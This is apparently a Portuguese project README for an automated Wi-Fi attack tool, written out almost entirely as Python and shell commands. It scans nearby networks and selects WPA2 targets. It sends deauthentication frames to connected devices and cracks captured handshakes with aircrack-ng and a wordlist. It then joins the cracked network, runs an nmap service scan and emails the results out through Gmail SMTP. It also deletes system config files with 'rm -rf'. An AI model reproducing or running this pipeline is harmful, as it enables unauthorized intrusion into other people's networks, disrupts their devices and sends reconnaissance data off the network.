# Scanning GPD

### Automatização com Python e Shell Script

1. Ler interfaces de rede:
```sh
o = os.popen('iwconfig').read()
```

2. Encerrar os processos que utilizam a interface de rede:
```sh
o = os.popen('sudo airmon-ng check kill').read()
```

3. Iniciar a interface Wi-Fi em modo monitor:
```sh
o = os.popen('sudo airmon-ng start wlan1').read()
```

4. Capturar pacotes das redes do ambiente e armazenando em um arquivo csv:
```sh
o = os.popen('sudo nohup airodump-ng -w ' +outputName + ' --output-format csv wlan1mon &')
```

5. Encerrar processos pendurados do airodump-ng
```sh
os.system('sudo ps aux | grep airo | awk \'{print $2}\' | xargs sudo kill -9')
```

6. Processar saída em csv do airodump-ng com o objetivo de formar a lista de redes a serem crackeadas
```sh
loadNetworks(outputName)
```

7. Para rede que atende o critério (criptografia = WPA2 ou WPA2 WPA)

- Iniciar captura do Handshake
```sh
os.popen("sudo nohup airodump-ng -c " + channel + " --bssid " + bssid + " -w " + outputName + " wlan1mon &")
```

- Enviar sinais de desautenticação para os dispositivos conectados na rede
```sh
os.popen("sudo nohup aireplay-ng --deauth 10 -a " + bssid + " wlan1mon &")
```

- Encerrar processos pendurados do airodump-ng
```sh
os.system('sudo ps aux | grep airo | awk \'{print $2}\' | xargs sudo kill -9')
```

- Iniciar o crack da senha da rede
```sh
os.system("sudo nohup aircrack-ng -b " + bssid + " -w " + pathToWordlist + " " + outputName + "-02.cap > " + outputName + ".txt")
```

- Processar resultado do aircrack (senha encontrada ou não)
- Senha não encontrada:
- - Tentar crack na próxima rede
- Senha encontrada:
- - Desabilitar o modo monitor da interface de rede
```sh
o = os.popen('sudo airmon-ng stop wlan1mon').read()
```
- - Conectar dispositivo na rede
- - Encerrar processos wpa_supplicant anteriores
```sh
os.system('sudo ps aux | grep wpa | awk \'{print $2}\' | xargs sudo kill -9')
```

- - Remover configuração de rede anterior
```sh
os.system('sudo rm -rf /etc/wpa_supplicant/wpa_supplicant.conf')
```

- - Criar novo arquivo de configuração com dados descobertos da rede
```sh
wpaSupplicantFile = open(wpaSupplicantFileName, "a+")
wpaSupplicantFile.write("ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev\n")
wpaSupplicantFile.write("update_config=1\n")
wpaSupplicantFile.write("country=BR\n")
wpaSupplicantFile.write("\n")
wpaSupplicantFile.write("network={\n")
wpaSupplicantFile.write("  ssid=\""+ ssid + "\"\n")
wpaSupplicantFile.write("  psk=\""+ senha + "\"\n")
wpaSupplicantFile.write("}\n")
```

- - Executar wpa_supplicant para estabelecer conexão com a rede Wi-Fi
```sh
os.system('sudo -b  wpa_supplicant -i ' + interface + ' -c /etc/wpa_supplicant/wpa_supplicant.conf -d -D wext > ' + verboseOutputConnectionFileName)
```

- Executar nmap 
```sh
nmapCommand = os.popen("nmap -sV 8.8.8.8 | awk '(NF==4 || NF==3) && $1!=" + '"PORT" {printf(\"%s;;%s;;%s;;%s||\"' + ", $1, $2, $3, $4);}'")
!!!!!!!!!!!!!!!!  pegar comando na versao final !!!!!!!!!!!!!!
```

- Enviar por e-mail o relatório contendo dados da rede e o escaneamento de portas do nmap
```sh
server = smtplib.SMTP('smtp.gmail.com:587')
server.starttls()
server.login(_remetente, _senha)
response = server.sendmail(msg['From'], [msg['To']], msg.as_string())
server.quit()
```







